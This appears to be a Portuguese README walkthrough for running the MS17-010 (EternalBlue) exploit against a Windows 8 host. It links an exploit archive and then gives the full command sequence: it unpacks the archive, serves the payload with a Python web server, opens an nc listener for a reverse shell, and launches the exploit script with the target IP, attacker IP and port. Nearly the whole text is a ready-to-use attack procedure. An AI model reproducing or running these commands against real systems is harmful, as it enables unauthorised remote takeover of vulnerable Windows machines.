Realize o download do exploit, descompacte o arquivo ms17-010.tar.gz.
<br>

https://github.com/d3fudd/MS17-010_EternalBlue/raw/main/ms17-010.tar.gz
```
tar xf ms17-010.tar.gz
```
```
cd ms17-010/win8/
```

### Exploração
Inicie um web server dentro de *win8/* **(em outro terminal)**:
```
python3 -m http.server 80
```
Prepare o Kali para receber a conexão reversa **(em outro terminal)**:
```
rlwrap nc -vnlp 8081
```
Execute o **exploit_win8.py** com python2 informando nos parâmetros o IP do Windows alvo, IP do Kali e a porta que receberá a shell reversa:
```
python2 exploit_win8.py 192.168.10.114 192.168.100.3 8081
```

![win8poc](https://user-images.githubusercontent.com/76706456/197260759-83dbc652-7974-4f36-98b6-2df9737bc3e5.gif)
